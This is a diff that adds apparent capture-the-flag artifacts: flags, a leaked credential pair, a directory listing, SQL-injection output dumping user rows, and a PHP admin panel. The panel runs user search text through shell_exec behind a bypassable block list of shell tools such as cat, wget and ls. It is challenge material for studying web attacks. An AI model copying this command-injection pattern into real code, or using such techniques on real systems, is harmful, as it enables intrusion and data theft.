@@ -1,0 +1,89 @@
+cdb{2d412133-fab5-462c-b73d-c8237d42b0d8}
+
+lovely_monkey_1337:ashley_lovely_tigger_31337
+
+total 32
+drwxr-xr-x 1 root root 4096 Jan  3 15:35 .
+drwxr-xr-x 1 root root 4096 Jan  3 15:35 ..
+-rw-r--r-- 1 root root   22 Jan  3 15:35 .3272dd7840718d7053771e3382082eb7
+drwxr-xr-x 2 root root 4096 Dec 27  2018 descr
+-rw-r--r-- 1 root root  982 Apr 13  2020 documents.php
+drwxr-xr-x 2 root root 4096 Dec 27  2018 img
+drwxr-xr-x 2 root root 4096 Dec 27  2018 style
+
+miniBoss
+SELECT GROUP_CONCAT('[user:', BINARY user, ' USER:', BINARY USER, ']') FROM {target_table}
+[id:1],[id:2],[id:3],[id:4]
+1 [user:adminTrash,USER:adminTrash]
+2 [user:admin_Trash,USER:admin_Trash]
+3 [user:rootNotAdmin,USER:rootNotAdmin]
+4 [user:admin,USER:admin]
+
+wuuut?youTryHackUs!??!
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Admin panel</title>
+	<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+	<h2>Admin control panel</h2>
+	<div class="control">
+		<form action="" method="POST">
+			<input type="submit" name="read" value="Read all orders">
+		</form>
+		<form action="" method="POST">
+			<input type="text" name="query" placeholder="enter SQL query">
+			<input type="submit" name="exec" value="Execute">
+		</form>
+		<form action="" method="POST">
+			<input type="text" name="searchTxt" placeholder="seach in orders">
+			<input type="submit" name="search" value="Search">
+		</form>
+	</div>
+
+	<?php 
+
+		if(isset($_POST['read'])){
+			$str = htmlentities(file_get_contents("../orders.w"));
+			echo "<div class='res'>";
+			foreach (explode("\n", $str) as $value) {
+				echo "<p>$value</p><br>";
+			}
+			echo "</div>";
+		}
+
+		if(isset($_POST['exec']) && isset($_POST['query'])){
+			$query = $_POST['query'];
+			echo "<p>$query</p><br>";
+			echo "<pre>Executed</pre>";
+		}
+
+		if(isset($_POST['search']) && isset($_POST['searchTxt'])){
+			$search = $_POST['searchTxt'];
+			$blacklist = array(
+							'&' => '',
+							';' => '',
+							'ls' => '',
+							'pwd' => '',
+							'cat' => '',
+							'wget' => '',
+							'ns' => '',
+							'|' => ''
+							);
+			$search = str_replace(array_keys($blacklist), $blacklist, $search);
+			echo "<div class='res'>";
+			$cmd = shell_exec('cat ../orders.w | grep '.$search);
+			echo "<p>$cmd</p>";
+			echo "</div>";
+		}
+
+
+	?>
+
+</body>
+</html>
+
+cdb{25db25c7-5da7-4e23-9d04-8c3a8363e1d8}
